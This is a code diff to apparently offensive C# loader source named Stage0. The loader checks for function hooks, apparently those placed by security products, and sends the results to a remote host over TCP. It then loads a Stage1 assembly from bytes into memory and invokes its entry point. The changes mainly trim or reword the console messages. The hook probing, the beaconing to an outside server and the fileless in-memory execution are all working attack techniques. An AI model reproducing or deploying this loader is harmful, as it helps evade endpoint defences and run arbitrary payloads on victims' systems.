@@ -70,7 +70,7 @@ namespace Stage0
 
                 if (safe)
                 {
-                    Console.WriteLine(fmtFunc + "- SAFE");
+                    //Console.WriteLine(fmtFunc + "- SAFE");
                     HookChecks[i] = 0;
                 }
                 else
@@ -88,7 +88,6 @@ namespace Stage0
 
             string data = BitConverter.ToString(HookChecks);
             //data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-            Console.WriteLine("Sending: {0}", data);
             SendData(_host, Convert.ToInt32(_port), HookChecks);
         }
 
@@ -108,7 +107,7 @@ namespace Stage0
 
 
                 // Send the message to the connected TcpServer.
-                Console.WriteLine("Sending {0} bytes", message.Length);
+                Console.WriteLine("[>] Sending results to the server...");
                 stream.Write(message, 0, message.Length);
 
                 // Receive the TcpServer.response.
@@ -185,11 +184,10 @@ namespace Stage0
         {
             try
             {
-                Console.WriteLine("[>] Loading Stage1 into memory...");
+                Console.WriteLine("[>] Loading Stage1...");
                 Assembly assembly = Assembly.Load(bytes);
                 MethodInfo method = assembly.EntryPoint;
-                //object[] parameters = null;
-                Console.WriteLine("[>] Invoking entrypoint...");
+                Console.WriteLine("[>] Invoking entrypoint...\n");
                 method.Invoke(null, null);
             }
             catch (Exception ex)
